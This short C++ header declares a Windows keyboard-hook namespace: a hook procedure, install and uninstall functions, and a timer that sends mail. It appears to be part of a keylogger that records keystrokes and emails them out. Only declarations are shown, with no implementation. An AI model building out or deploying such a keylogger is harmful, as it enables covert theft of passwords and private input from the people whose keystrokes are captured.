//
// Created by younes.benhoumich on 11/02/2018.
//

#pragma once

#include <iostream>
#include <fstream>
#include <windows.h>
#include "KeyConstants.hpp"
#include "SendMail.hpp"

namespace KeyboardHook {

    extern Timer MailTimer;

    void TimerSendMail();

    LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam);

    bool InstallHook();

    bool UninstallHook();

    bool IsHooked();
}
